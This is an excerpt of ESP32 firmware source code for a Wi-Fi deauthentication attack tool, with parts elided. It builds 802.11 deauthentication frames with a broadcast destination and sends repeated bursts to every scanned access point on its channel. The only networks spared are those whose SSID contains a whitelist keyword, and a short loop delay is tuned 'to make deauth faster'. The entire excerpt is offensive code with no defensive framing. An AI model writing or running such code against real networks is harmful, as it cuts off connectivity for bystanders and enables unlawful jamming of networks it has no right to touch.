...
struct AP_Info {
    ...
    String ssid;       // SSID of the AP
};

#define MAX_APS 20      // Maximum number of access points to store
String whitelist_keyword = "SafeNetwork";  // Keyword for whitelisting by SSID
...
uint8_t deauth_frame_default[26] = {
    ...
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,       // Destination address (broadcast by default)
...
// Function to check if an SSID contains the whitelist keyword
bool isSSIDWhitelisted(const String& ssid) {
    return ssid.indexOf(whitelist_keyword) >= 0;  // Returns true if keyword is found in SSID
}

// Function to send a deauth frame to a specific AP and client
void sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t client_mac[6]) {
    // Set the ESP32 to operate on the same channel as the target AP
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    
    // Set the destination MAC (client MAC) and source MAC (AP MAC) in the deauth frame
    memcpy(&deauth_frame_default[4], client_mac, 6);   // Destination (Client MAC)
    ...
    for (int i = 0; i < 10; i++) {  // Send 10 deauth frames per AP per iteration
...
void deauthFromScanResults() {
    ...
    for (int i = 0; i < ap_count; i++) {
        // Check if the SSID contains the whitelist keyword
        if (isSSIDWhitelisted(ap_list[i].ssid)) {
            continue;  // Skip deauth if SSID is whitelisted
        }

        // Send the deauth frame to each AP
        sendDeauthFrame(ap_list[i].bssid, ap_list[i].channel, client_mac);
    }
}
...
void loop() {
    ...
    delay(10);  // Reduce the delay to make deauth faster (adjust to your needs)
}
